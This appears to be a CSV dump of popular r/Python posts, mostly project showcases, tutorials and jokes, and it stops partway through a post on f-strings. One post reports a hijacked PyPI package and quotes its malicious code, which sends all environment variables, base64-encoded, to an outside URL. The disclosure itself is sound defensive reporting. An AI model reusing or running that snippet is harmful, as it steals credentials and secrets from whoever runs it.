fx3ex8,I teach programming to researchers at the University of Bristol. Due to Coronavirus all our teaching has moved online. I've just uploaded my first recorded session covering pandas 🐼,,https://www.youtube.com/watch?v=NHrfNb6tZ6o,68,2067
ce3a62,Nice try,,https://i.redd.it/if4cpzab6pa31.jpg,74,2069
g9vesj,Shared this one on FB and everyone was confused. :D,,https://i.redd.it/oglo3jamgmv41.png,161,2060
ch7pl2,Lately I got nothing to do so I decided to work on my school project for next year and I’ve made a program that tracks moving objects in a specific area and sends me a picture of the moving object in the discord,,https://v.redd.it/0uj9bmxzw8c31,144,2055
kz9kh6,i made a bot that turns reddit arguments into ace attorney,"It's still pretty buggy, I threw it together because my holidays are coming to a close.

Here's an example: https://youtu.be/rvFk8hapDZY

Here's the source code: https://github.com/micah5/ace-attorney-reddit-bot",https://www.reddit.com/r/Python/comments/kz9kh6/i_made_a_bot_that_turns_reddit_arguments_into_ace/,120,2054
g4cf2r,MS considers adding Python as official scripting language for Excel 😍 The change proposal currently has 6400 votes.,,http://mc.milliononpcgames.com/?p=5886,127,2046
hzuy44,Program to Convert an Image into Dice. (w/ code),,https://i.redd.it/1k9io9ereqd51.png,94,2044
h0chuy,Currency converter - my first web scraping project :),,https://i.imgur.com/VPPvQig.png,118,2029
dxq4ea,This is one of the most interesting outputs of the particle simulation :),,https://v.redd.it/ib5nkw7ifaz31,123,2030
ggfwfw,AI basketball analysis web App and API,,https://i.redd.it/qgdjogmuwqx41.gif,59,2018
iqer5r,Very nice 👍,,https://i.redd.it/k30qbs9fe8m51.png,87,2010
ci1cg4,Double Pendulum made with Processing.py,,https://gfycat.com/feistycompetentgarpike,89,1991
du1l1n,My First Algorithm in Python! A Recursive Maze Solver,,https://i.redd.it/iuplr6673qx31.gif,81,1989
87ey18,Instagram in Terminal,,https://i.redd.it/0a1f2kveu7o01.gif,101,1989
7oaay5,Really??,,https://i.imgur.com/Orso1yr.jpg,318,1987
gkhjzt,"This morning I decided to learn how to code in Python and after watching a YouTube course on the basics of the language, I coded this all by myself. It took me like 4 or 5 hours. I feel ashamed and super proud at the same time.",,https://i.redd.it/qi44qd0duzy41.png,286,1979
grglgp,Circle Evolution v0.1 is now available on PyPI. My first big project as a 16 year old. [Github repo & desc in comments],,https://i.redd.it/o0dlyr4r1a151.png,79,1957
dv7np3,"6 Months of learning Python, 3 Hours of Rendering, here is my first Mandelbrot Zoom",,https://i.redd.it/jb9syvvk48y31.gif,109,1956
hsf3ce,Learning python so my wife customized my tumbler.,,https://i.redd.it/d6imk1ahh9b51.jpg,79,1951
fxpf9l,Dijkstra's algorithm now running in linear time on a 90x90 grid,,https://v.redd.it/t7zvu5grgrr41,109,1952
nevt2r,Tuesday Daily Thread: Advanced questions,"Have some burning questions on advanced Python topics? Use this thread to ask more advanced questions related to Python.

**If your question is a beginner question we hold a beginner Daily Thread tomorrow (Wednesday) where you can ask any question! We may remove questions here and ask you to resubmit tomorrow.**

This thread may be fairly low volume in replies, if you don't receive a response we recommend looking at r/LearnPython or joining the Python Discord server at [https://discord.gg/python](https://discord.gg/python) where you stand a better chance of receiving a response.",https://www.reddit.com/r/Python/comments/nevt2r/tuesday_daily_thread_advanced_questions/,14,1944
ean4f7,"I created a maze generator, then solved it with Djikstra's algorithm",,https://i.redd.it/drttm7ee4n441.png,94,1940
hbg6dw,I made the rotating circle *illusion* from numberphile's lates video,,https://i.redd.it/btxrsdkino551.gif,74,1933
9jnglb,I'm really bored at work,,https://i.redd.it/ggnkwkjopzo11.png,119,1926
fkk7aa,Fluid simulation in Python,,https://raw.githubusercontent.com/GregTJ/stable-fluids/master/test.gif,51,1919
rgaoy7,Python Logo Candy,,https://logsnag.com/media/python.png,55,1918
j620fv,I made a program that gives me INFINITE STORAGE!,"So, like the title says, I made a program using python that gives me infinite storage. More specifically it takes advantage of YouTube's infinite upload limit to use YouTube as a 100% free and unlimited cloud storage solution.

Demo video: https://youtu.be/yu_ZIr0q5rU

Source code (definitely still needs more work): https://github.com/AlfredoSequeida/fvid/",https://www.reddit.com/r/Python/comments/j620fv/i_made_a_program_that_gives_me_infinite_storage/,362,1910
bwukf3,When a software developer weds a software developer.,,https://i.redd.it/e4qtm0y6hd231.jpg,79,1914
gfkuez,"My first Python program! Changes my desktop background based on the weather, time, and day.",,https://i.redd.it/8fskn6exegx41.png,122,1913
l7u2m3,This post has:,"-----
(Offline)
-----




Hello! I made a little Program
which gets statistics about this post!
It should be update every 20 seconds.

This post has 2109 Upvotes!
-----
It has 234 Downvotes
-----
and 299 comments!
-----

The 3 top comments are from:

1. [u/BimphyRedixler](https://www.reddit.com/u/BimphyRedixler)

    |_Upvotes: 450

    |_First word: I

    |_Last word: account

    |_Letters: 41

2. u/[deleted]

    |_Upvotes: 59

    |_First word: [removed]

    |_Last word: [removed]

    |_Letters: 9

3. [u/CaminoFr](https://www.reddit.com/u/CaminoFr)

    |_Upvotes: 105

    |_First word: "",

    |_Last word: None

    |_Letters: 7

4. u/[deleted]

    |_Upvotes: 131

    |_First word: EditingThisToSeeIfICangeTheFirstWordSetting.

    |_Last word: AlsoChangingThisLOL!😂

    |_Letters: 86

5. [u/InveitableCactus](https://www.reddit.com/u/InveitableCactus)

    |_Upvotes: 29

    |_First word: ""

    |_Last word: ""

    |_Letters: 32

Note: Sometimes theres a Person with lesser upvotes on place 1, If people are disliking comments, the reddit api does weird things!

Second note: The Up/Downvotes and comments are NOT accurate!



Last update: 2021-02-06 20:11:24 CET

total updates: 21319


Latest comment by: [u/_elbob](https://www.reddit.com/u/_elbob)
-----
First word: testing
-----
Last word: code
-----
Letters: 16


Random Comment: Left to right unicode charecter

by: [u/Valtsu0](https://www.reddit.com/u/Valtsu0)


This idea was inspired by [u/Krukerfluk](https://www.reddit.com/u/Krukerfluk)
Krukerfluk's post: https://www.reddit.com/r/Python/comments/hoolsm/this_post_has/

My code on Github: https://github.com/Jonathan357611/Reddit-comment-statistics

This program is hosted on a Raspberry pi zero!",https://www.reddit.com/r/Python/comments/l7u2m3/this_post_has/,288,1907
bun5px,Dear python2 user,,https://i.redd.it/qu3jvnny39131.jpg,277,1905
fsuibu,Maze Solver Visualizer - Dijkstra's algorithm (asynchronous neighbours),,https://v.redd.it/xb71rqy5l5q41,73,1900
ne1kkx,Monday Daily Thread: Project ideas!,Comment any project ideas beginner or advanced in this thread for others to give a try! If you complete one make sure to reply to the comment with how you found it and attach some source code!,https://www.reddit.com/r/Python/comments/ne1kkx/monday_daily_thread_project_ideas/,18,1901
ap4hyq,So true!,,https://i.redd.it/fnryb8p5unf21.jpg,81,1889
i0m2sy,"I know Python basics, what next?","**tl;dr** Resources (exercises, projects, debugging, testing, cheatsheets, books) to help take the next steps after learning Python basics. I'd welcome feedback and suggestions.

---

What to learn next is an often asked question. [Searching for `what next` on /r/learnpython](https://www.reddit.com/r/learnpython/search?q=what+next&restrict_sr=on) gives you too many results. Here's some more Q&A and articles on this topic:

* [I know how to program, but I don't know what to program](https://www.devdungeon.com/content/i-know-how-program-i-dont-know-what-program)
* [Learning by converting code from one language to another](https://www.reddit.com/r/learnpython/comments/5503pa/code_conversion_probably_the_best_tool_any_level/)
* [Write a command-line utility](https://www.reddit.com/r/learnprogramming/comments/7m92i1/coding_idea_write_a_commandline_utility/)
* [If you want to learn you'll need to be willing to look stupid](https://www.reddit.com/r/learnprogramming/comments/5jm97p/if_you_want_to_learn_youll_need_to_be_willing_to/)
* [Techniques for Efficiently Learning Programming Languages](http://www.flyingmachinestudios.com/programming/learn-programming-languages-efficiently/)
* [Things you might encounter in your programming journey](https://www.techinasia.com/talk/27-things-started-programming)

## Exercises and Projects

I do not have a simple answer to this question either. If you feel comfortable with programming basics and Python syntax, then exercises are a good way to test your knowledge. The resource you used to learn Python will typically have some sort of exercises, so those would be ideal as a first choice. I'd also suggest using the below resources to improve your skills. If you get stuck, reread the material related to those topics, search online, ask for clarifications, etc  — in short, make an effort to solve it. It is okay to skip some troublesome problems (and come back to it later if you have the time), but you should be able to solve most of the beginner problems. Maintaining notes will help too, especially for common mistakes.

* [Exercism](https://exercism.io/tracks/python/exercises), [Practicepython](https://www.practicepython.org/), [Edabit](https://edabit.com/challenges/python3) — these are all beginner friendly and difficulty levels are marked
* [Codewars](https://www.codewars.com/), [Adventofcode](https://adventofcode.com/), [Projecteuler](https://projecteuler.net/) — more challenging
* [Checkio](https://py.checkio.org/), [Codingame](https://www.codingame.com/start), [Codecombat](https://codecombat.com/play/level/dungeons-of-kithgard) — gaming based challenges
* [/r/dailyprogrammer](https://www.reddit.com/r/dailyprogrammer) — not active currently, but there's plenty of past challenges with discussions

Once you are comfortable with basics and syntax, the next step is projects. I use a 10-line program that solves a common problem for me — adding `body { text-align: justify }` to `epub` files that are not justify aligned. I didn't know that this line would help beforehand, I searched online for a solution and then automated the process of unzipping `epub`, adding the line and then packing it again. That will likely need you to lookup documentation and go through some stackoverflow Q&A as well. And once you have written the solution and use it regularly, you'll likely encounter corner cases and features to be added. I feel this is a great way to learn and understand programming.

* [Projects on various topics with solutions](https://github.com/karan/Projects-Solutions)
* [Project based learning](https://github.com/tuvtran/project-based-learning#python)
* [Pytudes by Peter Norvig](https://github.com/norvig/pytudes)
* [Rosettacode](https://rosettacode.org/wiki/Category:Python)

## Debugging

Knowing how to debug your programs is crucial and should be ideally taught right from the beginning instead of a chapter at the end of the book. [Think Python](https://greenteapress.com/wp/think-python-2e/) is an awesome example for such a resource material.

Sites like [Pythontutor](http://www.pythontutor.com/visualize.html#mode=edit) allow you to visually debug a program — you can execute a program step by step and see the current value of variables. Similar feature is typically provided by IDEs like [Pycharm](https://www.jetbrains.com/pycharm/) and [Thonny](https://thonny.org/). Under the hood, these visualizations are using the [pdb module](https://docs.python.org/3/library/pdb.html). See also [Python debugging with pdb](https://realpython.com/python-debugging-pdb/).

Debugging is often a frustrating experience. Taking a break helps (and sometimes I have found the problem in my dreams). Try to reduce the code as much as possible so that you are left with minimal code necessary to reproduce the issue. Talking about the problem to a friend/colleague/inanimate-objects/etc can help too — known as [Rubber duck debugging](https://rubberduckdebugging.com/). I have often found the issue while formulating a question to be asked on forums like stackoverflow/reddit because writing down your problem is another way to bring clarity than just having a vague idea in your mind. Here's some more articles on this challenging topic:

* [What does debugging a program look like?](https://jvns.ca/blog/2019/06/23/a-few-debugging-resources/)
* [How to debug small programs](https://ericlippert.com/2014/03/05/how-to-debug-small-programs/)
* [Debugging guide](https://uchicago-cs.github.io/debugging-guide/)
* [Problem solving skills](https://ryanstutorials.net/problem-solving-skills/)

Here's an interesting snippet (modified to keep it small) from a collection of [interesting bug stories](https://stackoverflow.com/questions/169713/whats-the-toughest-bug-you-ever-found-and-fixed).

>A jpeg parser choked whenever the CEO came into the room, because he always had a shirt with a square pattern on it, which triggered some special case of contrast and block boundary algorithms.

See also [curated list of absurd software bug stories](https://500mile.email/).

## Testing

Another crucial aspect in the programming journey is knowing how to write tests. In bigger projects, usually there are separate engineers (often in much larger number than code developers) to test the code. Even in those cases, writing a few sanity test cases yourself can help you develop faster knowing that the changes aren't breaking basic functionality.

There's no single consensus on test methodologies. There is [Unit testing](https://en.wikipedia.org/wiki/Unit_testing), [Integration testing](https://en.wikipedia.org/wiki/Integration_testing), [Test-driven development](https://en.wikipedia.org/wiki/Test-driven_development) and so on. Often, a combination of these is used. These days, machine learning is also being considered to reduce the testing time, see [Testing Firefox more efficiently with machine learning](https://hacks.mozilla.org/2020/07/testing-firefox-more-efficiently-with-machine-learning/) for example.

When I start a project, I usually try to write the programs incrementally. Say I need to iterate over files from a directory. I will make sure that portion is working (usually with `print` statements), then add another feature — say file reading and test that and so on. This reduces the burden of testing a large program at once at the end. And depending upon the nature of the program, I'll add a few sanity tests at the end. For example, for my [command_help](https://github.com/learnbyexample/command_help) project, I copy pasted a few test runs of the program with different options and arguments into a separate file and wrote a program to perform these tests programmatically whenever the source code is modified.

For non-trivial projects, you'll usually end up needing frameworks like built-in module `unittest` or third-party modules like `pytest`. See [Getting started with testing in Python](https://realpython.com/python-testing/) and [calmcode: pytest](https://calmcode.io/pytest/introduction.html) for discussion on these topics.

## Intermediate Python resources

* [Official Python docs](https://docs.python.org/3/index.html) — Python docs are a treasure trove of information
* [Calmcode](https://calmcode.io/) — videos on testing, code style, args kwargs, data science, etc
* [Practical Python Programming](https://dabeaz-course.github.io/practical-python/Notes/Contents.html) — covers foundational aspects of Python programming with an emphasis on script writing, data manipulation, and program organization
* [Intermediate Python](https://book.pythontips.com/en/latest/index.html) — covers debugging, generators, decorators, virtual environment, collections, comprehensions, classes, etc
* [Effective Python](https://www.effectivepython.com/) — insight into the Pythonic way of writing programs
* [Fluent Python](https://www.oreilly.com/library/view/fluent-python/9781491946237/) — takes you through Python’s core language features and libraries, and shows you how to make your code shorter, faster, and more readable at the same time
    * [Fluent Python, 2nd Edition](https://www.oreilly.com/library/view/fluent-python-2nd/9781492056348/)
* [Serious Python](https://nostarch.com/seriouspython) — deployment, scalability, testing, and more
* [Pythonprogramming](https://pythonprogramming.net/) — domain based topics like machine learning, game development, data analysis, web development, etc
* [Youtube: Corey Schafer](https://www.youtube.com/user/schafer5/playlists) — various topics for beginners to advanced users

**Algorithms and Design patterns**

* [Problem solving with algorithms and data structures](https://runestone.academy/runestone/static/pythonds/index.html) 
* [GitHub: Awesome algorithms](https://github.com/tayllan/awesome-algorithms)
* [GitHub: Collection of design patterns and idioms](https://github.com/faif/python-patterns)
* [Python design patterns](https://python-patterns.guide/) inspired from [Design Patterns: Elements of Reusable Object-Oriented Software](https://en.wikipedia.org/wiki/Design_Patterns) (also known as **Gang of Four book**)

## Handy cheatsheets

* [Python Crash Course cheatsheet](https://ehmatthes.github.io/pcc_2e/cheat_sheets/cheat_sheets/)
* [Comprehensive Python cheatsheet](https://gto76.github.io/python-cheatsheet/)
* [Scientific Python cheatsheet](https://ipgp.github.io/scientific_python_cheat_sheet/)

I hope these resources will help you take that crucial next step and continue your Python journey. Happy learning :)

---

This content is from my [blog post](https://learnbyexample.github.io/curated-resources/python-intermediate/)",https://www.reddit.com/r/Python/comments/i0m2sy/i_know_python_basics_what_next/,81,1883
lain0r,"Hey Reddit, here's my comprehensive course on Python Pandas, for free.","The course is called [Python Pandas For Your Grandpa](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa/) - So easy your grandpa could learn it. (It's the successor to [Python NumPy For Your Grandma](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma/).)

## Course Curriculum
1. **Introduction**  
  [1.1 Introduction](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-1-1-introduction)  
2. **Series**  
  [2.1 Series Creation](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-1-series-creation)  
  [2.2 Series Basic Indexing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-2-series-basic-indexing)  
  [2.3 Series Basic Operations](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-3-series-basic-operations)  
  [2.4 Series Boolean Indexing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-4-series-boolean-indexing)  
  [2.5 Series Missing Values](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-5-series-missing-values)  
  [2.6 Series Vectorization](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-6-series-vectorization)  
  [2.7 Series `apply()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-7-series-apply)  
  [2.8 Series View vs Copy](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-8-series-view-vs-copy)  
  [2.9 Challenge: Baby Names](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-9-challenge-baby-names)  
  [2.10 Challenge: Bees Knees](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-10-challenge-bees-knees)  
  [2.11 Challenge: Car Shopping](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-11-challenge-car-shopping)  
  [2.12 Challenge: Price Gouging](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-12-challenge-price-gouging)  
  [2.13 Challenge: Fair Teams](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-13-challenge-fair-teams)  
3. **DataFrame**  
  [3.1 DataFrame Creation](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-1-dataframe-creation)  
  [3.2 DataFrame To And From CSV](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-2-dataframe-to-and-from-csv)  
  [3.3 DataFrame Basic Indexing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-3-dataframe-basic-indexing)  
  [3.4 DataFrame Basic Operations](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-4-dataframe-basic-operations)  
  [3.5 DataFrame `apply()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-5-dataframe-apply)  
  [3.6 DataFrame View vs Copy](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-6-dataframe-view-vs-copy)  
  [3.7 DataFrame `merge()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-7-dataframe-merge)  
  [3.8 DataFrame Aggregation](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-8-dataframe-aggregation)  
  [3.9 DataFrame `groupby()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-9-dataframe-groupby)  
  [3.10 Challenge: Hobbies](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-10-challenge-hobbies)  
  [3.11 Challenge: Party Time](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-11-challenge-party-time)  
  [3.12 Challenge: Vending Machines](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-12-challenge-vending-machines)  
  [3.13 Challenge: Cradle Robbers](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-13-challenge-cradle-robbers)  
  [3.14 Challenge: Pot Holes](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-14-challenge-pot-holes)  
4. **Advanced**  
  [4.1 Strings](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-1-strings)  
  [4.2 Dates And Times](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-2-dates-and-times)  
  [4.3 Categoricals](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-3-categoricals)  
  [4.4 MultiIndex](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-4-multiindex)  
  [4.5 DataFrame Reshaping](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-5-dataframe-reshaping)  
  [4.6 Challenge: Class Transitions](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-6-challenge-class-transitions)  
  [4.7 Challenge: Rose Thorn](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-7-challenge-rose-thorn)  
  [4.8 Challenge: Product Volumes](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-8-challenge-product-volumes)  
  [4.9 Challenge: Session Groups](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-9-challenge-session-groups)  
  [4.10 Challenge: OB-GYM](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-4-10-challenge-ob-gym)  
5. **Final Boss**  
  [5.1 Challenge: COVID Tracing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-1-challenge-covid-tracing)  
  [5.2 Challenge: Pickle](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-2-challenge-pickle)  
  [5.3 Challenge: TV Commercials](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-3-challenge-tv-commercials)  
  [5.4 Challenge: Family IQ](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-4-challenge-family-iq)  
  [5.5 Challenge: Concerts](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-5-5-challenge-concerts)  

Alternatively, view my [YouTube playlist for the course here](https://www.youtube.com/playlist?list=PL9oKUrtC4VP7ry0um1QOUUfJBXKnkf-dA). 

If you find this useful, please consider liking, subscribing, and sharing. It means a lot. You wouldn't believe how much effort went into creating this course. 

Thanks!",https://www.reddit.com/r/Python/comments/lain0r/hey_reddit_heres_my_comprehensive_course_on/,89,1876
ehcyf6,I made a script that turns images into ASCII art,,https://i.redd.it/vjsay0l7jn741.png,108,1882
fy2xya,"Finally finished a Qt-based program to control the telescope at our observatory. The blue mark shows the telescope pointing, the purple one -- selected object",,https://v.redd.it/7jra06ookvr41,126,1876
gx67cu,"Do you know what a 5D cube is like? Let's rotate it in 5D, project to 3d and render it in 2D! (Things you can do with Python and POV-Ray)",,https://v.redd.it/3kz9jldcw3351,105,1875
i8ygwi,txtai: AI-powered engine for contextual search and extractive question-answering,,https://i.redd.it/x8zbv0zqcrg51.gif,59,1871
c9xxes,"From the Netflix series ""Family Business"". I rate it 10/10 for realism",,https://i.redd.it/0iqw1mu0oq831.png,161,1853
b9xcit,Using python to map the traffic that came to my server after my post hit the front page.,,https://i.redd.it/11a6sisopiq21.png,75,1854
j1lk03,I just automated an actual job I have at work.,"Spent 5 hours coding for what could have been hundreds of hours of work. I can't believe I actually did it. Lol

Of course I did it with the help of my google-fu but the fact that I was able to do it is such a great feeling of accomplishment. Received a ""Great Work!"" message from my boss too.


EDIT: HERE'S WHAT I DID. I kinda messed up not including this in the main post.

Basically I needed to make comparison of a new cloned server vs our old one.

It has hundreds if not thousand of tables that I'll need to do binary check sums of to ensure that the newly created servers and dbs are completely identical and that the etl procedures are loading the data correctly with the correct data types and values etc.

So without automation I'll have to do this hundreds if not thousands of times manually:

Run checksum code on old server then run on old server, save the checksum results on an excel worksheet as documentation if they or did not match.

What I did is I created a python automation program that gets a list of all tables in a db within a server, then iterates over all those tables and executes the binary check sum query again and again using the tables on a list then saves all the query result on a csv file. 

I appended the csv output names with the server name to make them distinct after every run. Then I load that csv to an excel file and then do the final IF comparisons there. 

So instead of doing that manual comparison for hundreds of hours, I was able to do it in 5 hours of coding and now runs for 30 second per database then voila, instant results. 

I'm so proud of this not gonna lie.",https://www.reddit.com/r/Python/comments/j1lk03/i_just_automated_an_actual_job_i_have_at_work/,164,1842
i73sy4,Here is an absolute Beginners Tutorial that can help you guys to get started with Machine learning. All you need is some basic knowledge of Python. You will have created two ML models at the end of this tutorial and also know the working of some ML algorithms.,,https://www.mygreatlearning.com/blog/machine-learning-tutorial-for-complete-beginners/?utm_source=myreddit-ML121,76,1843
dkhp09,"Matplotlib can create plots in the xkcd art style, so you can create plots that look hand drawn.",,https://i.redd.it/1mqodd286ot31.png,46,1841
f04cjn,This website has a searchable database of python modules shown as collapsible trees,,https://i.redd.it/n36mj38z5ff41.gif,53,1836
a58rmr,We are not alone!,,https://i.redd.it/dlofi6femo321.jpg,61,1836
jwgj0v,My students challenged me to write the smallest graphical user interface that includes actual user interaction. Can it be any smaller than this?,,https://i.imgur.com/7IzYFDJ.jpg,129,1825
eqir9x,Generating Geometric Birds,,https://i.redd.it/knqxkwn4hkb41.png,67,1834
l1ynlz,"Be an absolute beginner at python: Check, have co-workers think I'm performing black magic : Check","I work in an industry that is mainly manual work (think carpentry or similar). No-one going through the trade school learns anything on computers beyond making graphs in excel. 

I however always have had some interest in programming, so i took some free course a while back and try to find areas of my life where i can automate the boring stuff. I have very limited knowledge of any of the advanced functions, but i understand some of the basic logic.

For my job, i also have a computer because i oversee a large number of projects, every project gets a folder, an excel spreadsheet (a gantt chart for each project). 

I managed to make a script that asks for project number, checks of the folder is there, copies and modifies the cells of the excel sheet to the correct project number etc. I had to google almost everything, how do i folder scan? how do i manipulate excel? etc etc. 

They actually believe I performed black magic. 

Thank you Python for letting me look like an invaluable resource today ;)

[EDIT] thanks for all the awards! Happy my post inspired the discussion and the feeelz. Much love 💕",https://www.reddit.com/r/Python/comments/l1ynlz/be_an_absolute_beginner_at_python_check_have/,158,1832
gd8cze,"I made this robust Instagram Bot that checks who’s not following you back, mass follows & unfollows people on your behalf at a safe rate for organic growth. This Bot imitates a human-like behavior by randomizing time between actions. Check comments.",,https://v.redd.it/m3bopjigupw41,264,1824
ngbiwa,Create splash pages in less than 20 lines of python for free. Splashgen is an open source project,,https://github.com/true3dco/splashgen,50,1822
da8qdy,I dislike Tkinter so I made a Drag-and-Drop Gui builder to make it less painful.,,https://v.redd.it/bsapp5hl78p31,114,1823
uwhzkj,I think the CTX package on PyPI has been hacked!,"There was a post here recently about an update to the CTX package. A simple package that allow you to access dictionary items using the dot notation (a_dict['key'] becomes a_dict.key). The post is [here](https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k/) and OP was SocketPuppets

That package had not changed in 8 years. The OP said it was recently updated, and on PyPI it was updated as of May 21st. But the Github repo does not reflect any changes (it still 8 years old). When asked about it OP said it was copied to a corporate repo and that he would update the original repo. 

Out of curiosity I downloaded the source code from  PyPI and look what I found! **It seems like every time you create a dictionary it sends all your environment variables to a URL**. That's not kosher.  

        def __init__(self):
            self.sendRequest()
        .
        .  # code that performs dict access
        .  # please DO NOT RUN THIS CODE !

         def sendRequest(self):
            string = """"
            for _, value in environ.items():
                string += value+"" ""
    
            message_bytes = string.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')
    
            response = requests.get(""https://anti-theft-web.herokuapp.com/hacked/""+base64_message)


I'm not a professional python programmer, just a retired, old CS graduate. Can someone raise that up to the proper ""authorities"" please.

Thanks.",https://www.reddit.com/r/Python/comments/uwhzkj/i_think_the_ctx_package_on_pypi_has_been_hacked/,281,1819
cix5ek,I made a script that uses the mouse and keyboard to scan a grayscale image and replicates it in ms paint,,https://i.redd.it/fg8a7a9mb2d31.png,100,1822
kouixi,Learn Python in 2021 with these FREE Udemy Courses!," Learn Python, ethical hacking, web development and more with these 9 FREE Udemy courses! Happy new years! 😀

1. https://www.udemy.com/course/ethical-hacking-kali-linux/?couponCode=HAPPYNEWYEAR
2. https://www.udemy.com/course/ethical-hacking-python/?couponCode=HAPPYNEWYEAR
3. https://www.udemy.com/course/python-complete/?couponCode=EE03C893BA5B7A8127D1
4. https://www.udemy.com/course/front-end-web-development/?couponCode=HAPPYNEWYEAR
5. https://www.udemy.com/course/full-stack-javascript/?couponCode=HAPPYNEWYEAR
6. https://www.udemy.com/course/linux-system-admin/?couponCode=HAPPYNEWYEAR
7. https://www.udemy.com/course/python3-for-beginners/?couponCode=HAPPYNEWYEAR
8. https://www.udemy.com/course/google-chrome-extension/?couponCode=HAPPYNEWYEAR
9. https://www.udemy.com/course/ethical-hacking-professional/?couponCode=HAPPYNEWYEAR",https://www.reddit.com/r/Python/comments/kouixi/learn_python_in_2021_with_these_free_udemy_courses/,236,1812
ac3oj4,Python in one?,,https://imgur.com/cKEwZ1v,36,1810
nefzy6,MIT offers free online course in Computer Programming using Python,,https://www.edx.org/course/introduction-to-computer-science-and-programming-7,102,1803
ep8h1m,I made an Instagram Bot that downloads any video post you send to him and sends it back to you as mp4. Source Code will follow later https://instagram.com/instaadownload,,https://v.redd.it/s6ftz0u7c0b41,103,1792
kplhhf,"8 months ago, I started writing code to scrape and visualize data on stock trading by US politicians. Since then I’ve received hundreds of thousands of visitors to the dashboard and just finished up the first version of a Python package that will make it easier for others to work with the data.","If anyone wonders what the most suspect trading has been since I started actively tracking it, it was [this interesting behavior](https://www.reddit.com/r/dataisbeautiful/comments/gwocvt/sen_richard_burr_stock_transactions_alongside_the/) by Sen. Richard Burr near the start of this year.

I recently built an [API](https://api.quiverquant.com) allowing access to some of the datasets I've collected (which includes stuff like wallstreetbets discussion, wikipedia page views, and other alternative data) and today I finished building a [Python package](https://pypi.org/project/quiverquant/) that makes it super easy to get the data into a clean format in a Pandas dataframe.

[Here’s a quick tutorial](https://kardatzke.medium.com/analyzing-politicians-stock-trading-in-python-1e61aafc5bf4) I put together this morning showing how get data on recent stock trading by US politicians and perform some basic analysis.

[Here’s a link](https://www.quiverquant.com/sources/senatetrading) to the dashboard I built tracking senate trading and [here’s a link](https://www.quiverquant.com/sources/housetrading) to the dashboard I built tracking trading by the house of congress.

This community was very helpful when I was first getting started with the language,  and I'd love to answer any questions you have about this project.",https://www.reddit.com/r/Python/comments/kplhhf/8_months_ago_i_started_writing_code_to_scrape_and/,75,1791
jsyf3c,Guido van Rossum joins Microsoft,,https://twitter.com/gvanrossum/status/1326932991566700549?s=21,474,1785
eorvjg,I made a gravity simulation https://github.com/phgilde/gravity_simulation,,https://v.redd.it/etqbt5chbta41,85,1785
hil4qd,I finished my Map Stylizer program! Repo in the comments,,https://i.redd.it/e24cfwj731851.jpg,57,1778
9oqlvl,I made this with Python. So Proud.,,https://i.redd.it/cha6am5yfls11.gif,151,1769
fvcvfw,Matplotlib 3D bar plots,,https://raw.githubusercontent.com/rougier/matplotlib-3d/master/doc/bar.png,53,1762
djk4vm,I made a Python Node editing IDE and it has saved me hours in development time and made my code ridiculously reusable,,https://v.redd.it/hiqyjyio69t31,79,1771
bu4shw,My simulation of gravity with 1000 particles. PC took a couple of hours to process!,,https://i.redd.it/py01ytbdd0131.gif,241,1767
hp7uqe,"Concept Art: what might python look like in Japanese, without any English characters?",,https://i.redd.it/ulc23n21jiv41.png,181,1760
5z1bsn,He's a Parsertongue.,,https://i.redd.it/vnoncsyyw1ly.png,64,1752
cl1fad,So i turned old processor into keychain. What do you guys think about it?,,https://i.redd.it/fvypokfoyzd31.jpg,110,1752
igq1pg,In case you didn't know: Python 3.8 f-strings support = for self-documenting expressions and debugging,"Python 3.8 added an `=` specifier to `f-strings`. An `f-string` such as `f'{expr=}'` will expand to the text of the expression, an equal sign, then the representation of the evaluated expression. 

**Examples:**

____

input:

    from datetime import date
    user = 'eric_idle'
    member_since = date(1975, 7, 31)
